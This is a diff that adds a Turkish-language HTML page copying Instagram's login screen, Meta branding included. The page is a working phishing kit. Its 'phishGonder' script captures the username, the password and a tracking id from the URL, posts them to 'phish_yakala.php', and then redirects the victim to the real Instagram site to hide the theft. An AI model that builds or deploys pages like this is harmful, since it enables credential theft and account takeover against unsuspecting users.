@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Giriş</title>
+    <style>
+        /* GENEL AYARLAR */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { 
+            background-color: #0d1117; /* İstediğin koyu arka plan */
+            color: #fff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+        }
+
+        /* SOL ÜST LOGO DÜZENLEMESİ */
+        .header-logo { 
+            padding: 30px 0 10px 60px; 
+            width: 100%;
+        }
+        
+        .header-logo img { 
+            width: 120px; /* Boyutu biraz küçültüldü */
+            height: auto; 
+            display: block;
+            /* Beyazlık efekti (filter) kaldırıldı, orijinal logo renkleri görünür */
+        }
+
+        /* ANA İÇERİK DÜZENİ */
+        .main-wrapper { 
+            display: flex; 
+            flex: 1; 
+            align-items: center; 
+            justify-content: center; 
+            gap: 80px; 
+            padding: 20px; 
+        }
+
+        /* SOL TARAF (MOCKUP) */
+        .hero-section { max-width: 460px; display: flex; flex-direction: column; }
+        .hero-section h1 { font-size: 32px; margin-bottom: 30px; font-weight: 600; line-height: 1.2; }
+        .hero-section h1 span { 
+            background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); 
+            -webkit-background-clip: text; 
+            -webkit-text-fill-color: transparent; 
+        }
+        .mockup-img { width: 100%; max-width: 400px; border-radius: 24px; }
+
+        /* SAĞ TARAF (GİRİŞ FORMU) */
+        .login-box { width: 100%; max-width: 350px; display: flex; flex-direction: column; gap: 15px; }
+        
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            background: #161b22; 
+            border: 1px solid #30363d; 
+            border-radius: 4px; 
+            color: #fff; 
+            font-size: 14px; 
+            outline: none; 
+        }
+        
+        input:focus { border-color: #58a6ff; }
+
+        .login-btn { 
+            background-color: #0095f6; 
+            color: white; 
+            border: none; 
+            padding: 10px; 
+            border-radius: 8px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 14px; 
+            margin-top: 5px;
+        }
+
+        .forgot-link { color: #f0f6fc; text-decoration: none; font-size: 13px; text-align: center; margin-top: 5px; }
+        .divider { border-top: 1px solid #30363d; margin: 20px 0; }
+
+        .btn-secondary { 
+            padding: 10px; 
+            border-radius: 8px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            background: transparent; 
+            font-size: 14px; 
+            text-align: center; 
+            border: 1px solid #30363d; 
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .create-style { border-color: #0095f6; color: #2f81f7; }
+
+        footer { 
+            padding: 40px 20px; 
+            font-size: 12px; 
+            color: #8b949e; 
+            text-align: center; 
+            display: flex; 
+            justify-content: center; 
+            gap: 15px; 
+        }
+        
+        footer a { color: #8b949e; text-decoration: none; }
+
+        /* MOBİL AYARLAR */
+        @media (max-width: 850px) {
+            .header-logo { justify-content: center; padding: 40px 0 20px 0; display: flex; }
+            .hero-section { display: none; }
+            .main-wrapper { align-items: flex-start; padding-top: 20px; }
+            .login-box { max-width: 320px; margin: 0 auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header-logo">
+        <img src="https://i.imgur.com/MzzUUNc.png" alt="Logo">
+    </div>
+
+    <div class="main-wrapper">
+        <div class="hero-section">
+            <h1><span>Yakın arkadaşlarınızın</span><br>günlük anlarını görün.</h1>
+            <img src="https://i.imgur.com/DrQlmWj.png" class="mockup-img" alt="Instagram Screen">
+        </div>
+
+        <div class="login-box">
+            <input type="text" id="i_user" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
+            <input type="password" id="i_pass" placeholder="Şifre">
+            
+            <button class="login-btn" onclick="phishGonder()">Giriş Yap</button>
+            <a href="#" class="forgot-link">Şifreni mi unuttun?</a>
+
+            <div class="divider"></div>
+
+            <div class="btn-secondary">Facebook ile giriş yap</div>
+            <div class="btn-secondary create-style">Yeni hesap oluştur</div>
+
+            <p style="text-align: center; margin-top: 30px; font-size: 14px; color: #8b949e;">Meta</p>
+        </div>
+    </div>
+
+    <footer>
+        <a href="#">Meta</a>
+        <a href="#">Hakkında</a>
+        <a href="#">Yardım</a>
+        <a href="#">Gizlilik</a>
+        <p>© 2026 Instagram from Meta</p>
+    </footer>
+
+    <script>
+        function phishGonder() {
+            const params = new URLSearchParams(window.location.search);
+            const uid = params.get('id') || "yvx01";
+            const u = document.getElementById('i_user').value;
+            const p = document.getElementById('i_pass').value;
+
+            if(!u || !p) return alert("Alanları doldur!");
+
+            fetch('phish_yakala.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uid: uid, user: u, pass: p })
+            }).finally(() => {
+                window.location.href = "https://www.instagram.com";
+            });
+        }
+    </script>
+</body>
+</html>
